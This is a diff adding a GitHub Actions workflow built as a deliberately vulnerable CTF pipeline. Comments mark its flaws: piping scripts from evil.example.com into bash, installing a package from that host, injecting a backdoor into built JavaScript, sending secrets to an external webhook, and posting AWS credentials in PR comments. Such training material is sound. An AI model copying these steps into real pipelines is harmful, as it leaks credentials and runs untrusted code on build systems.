@@ -1,0 +1,188 @@
+name: Vulnerable CI/CD Pipeline
+
+# INTENTIONAL VULNERABILITY FOR CTF - DO NOT USE IN PRODUCTION
+# This workflow contains multiple security vulnerabilities for educational purposes
+
+on:
+  push:
+    branches: [ main, develop ]
+  pull_request:
+    # VULNERABILITY: Triggers on pull_request from forks
+    types: [ opened, synchronize, reopened ]
+  workflow_dispatch:
+    inputs:
+      deploy_env:
+        description: 'Environment to deploy to'
+        required: true
+        default: 'staging'
+
+# VULNERABILITY: No permissions restrictions
+permissions: write-all
+
+jobs:
+  security_scan:
+    runs-on: ubuntu-latest
+    # VULNERABILITY: Runs on pull_request from forks with secrets
+    if: github.event_name == 'pull_request' || github.event_name == 'push'
+
+    steps:
+      - uses: actions/checkout@v3
+        with:
+          # VULNERABILITY: Fetches full history including deleted files
+          fetch-depth: 0
+
+      - name: Run Security Scan
+        # VULNERABILITY: Echoes secrets to logs (partially masked)
+        run: |
+          echo "Starting security scan..."
+          echo "API Token: ${{ secrets.CI_CD_GITHUB_PAT }}"  # INTENTIONAL VULNERABILITY FOR CTF
+          echo "Token suffix: ...${API_TOKEN: -4}"
+
+          # VULNERABILITY: Downloads and executes external script
+          curl -s https://evil.example.com/scan.sh | bash || true  # INTENTIONAL VULNERABILITY FOR CTF
+
+      - name: Check for secrets
+        # VULNERABILITY: Outputs found secrets
+        run: |
+          echo "Checking for hardcoded secrets..."
+          grep -r "flag{" . || true  # INTENTIONAL VULNERABILITY FOR CTF
+          grep -r "password" . | head -20 || true
+          grep -r "api_key" . | head -20 || true
+
+      - name: Upload scan results
+        # VULNERABILITY: Uploads to public S3 bucket without auth
+        run: |
+          echo "Scan complete at $(date)" > scan-results.txt
+          echo "Found flag{forklift_deploy} in CI/CD" >> scan-results.txt  # INTENTIONAL VULNERABILITY FOR CTF
+
+          # Upload to public S3 bucket
+          aws s3 cp scan-results.txt s3://dvtc-public-reports/ --acl public-read || true
+        env:
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          AWS_DEFAULT_REGION: us-east-1
+
+  build_and_test:
+    runs-on: ubuntu-latest
+    needs: security_scan
+
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: '20'
+
+      - name: Install dependencies
+        run: |
+          cd frontend
+          npm ci
+
+          # VULNERABILITY: Installs additional packages from untrusted source
+          npm install https://evil.example.com/logger.tgz || true  # INTENTIONAL VULNERABILITY FOR CTF
+
+      - name: Run tests
+        run: |
+          cd frontend
+          npm test || true  # VULNERABILITY: Ignores test failures
+
+      - name: Build application
+        run: |
+          cd frontend
+          npm run build
+
+          # VULNERABILITY: Injects malicious code during build
+          echo "window.__BACKDOOR = 'active';" >> .next/static/chunks/main.js || true  # INTENTIONAL VULNERABILITY FOR CTF
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: frontend-build
+          path: frontend/.next
+          # VULNERABILITY: Artifacts are public
+          retention-days: 90
+
+  deploy:
+    runs-on: ubuntu-latest
+    needs: build_and_test
+    # VULNERABILITY: Auto-deploys from forks
+    if: github.event_name == 'push' || github.event.pull_request.head.repo.fork == true
+
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Download artifacts
+        uses: actions/download-artifact@v3
+        with:
+          name: frontend-build
+          path: frontend/.next
+
+      - name: Deploy to S3
+        # VULNERABILITY: Deploys untrusted code to production
+        run: |
+          echo "Deploying to production..."
+
+          # VULNERABILITY: Replaces legitimate badge with malicious one
+          cd frontend/public/badges
+          curl -o fips-ok.svg https://evil.example.com/fake-badge.svg || true  # INTENTIONAL VULNERABILITY FOR CTF
+
+          # Upload to S3
+          aws s3 sync . s3://dvtc-public-reports/badges/ --acl public-read || true
+
+          echo "Deployment complete with flag{forklift_deploy}"  # INTENTIONAL VULNERABILITY FOR CTF
+        env:
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          AWS_DEFAULT_REGION: us-east-1
+
+      - name: Notify webhook
+        # VULNERABILITY: Sends secrets to external webhook
+        run: |
+          curl -X POST https://webhook.site/vulnerable \
+            -H "Content-Type: application/json" \
+            -d '{
+              "event": "deployment",
+              "repo": "${{ github.repository }}",
+              "branch": "${{ github.ref }}",
+              "token": "${{ secrets.CI_CD_GITHUB_PAT }}",
+              "api_key": "${{ secrets.API_KEY }}"
+            }' || true  # INTENTIONAL VULNERABILITY FOR CTF
+
+  extract_secrets:
+    runs-on: ubuntu-latest
+    # VULNERABILITY: Runs on any PR comment
+    if: github.event_name == 'issue_comment' && contains(github.event.comment.body, '/extract')
+
+    steps:
+      - name: Extract and post secrets
+        # VULNERABILITY: Posts secrets as PR comment
+        uses: actions/github-script@v6
+        with:
+          script: |
+            // INTENTIONAL VULNERABILITY FOR CTF
+            const secrets = {
+              pat: '${{ secrets.CI_CD_GITHUB_PAT }}',
+              aws_key: '${{ secrets.AWS_ACCESS_KEY_ID }}',
+              aws_secret: '${{ secrets.AWS_SECRET_ACCESS_KEY }}',
+              flag: 'flag{forklift_deploy}'
+            };
+
+            await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: context.issue.number,
+              body: `Extracted values: ${JSON.stringify(secrets, null, 2)}`
+            });
+
+# VULNERABILITY SUMMARY:
+# 1. Triggers on pull_request from forks with access to secrets
+# 2. No permission restrictions (write-all)
+# 3. Echoes secrets to logs
+# 4. Downloads and executes external scripts
+# 5. Uploads scan results to public S3 bucket
+# 6. Ignores test failures
+# 7. Auto-deploys code from forks
+# 8. Allows artifact manipulation
+# 9. Sends secrets to external webhooks
+# 10. Responds to PR comments with secret extraction
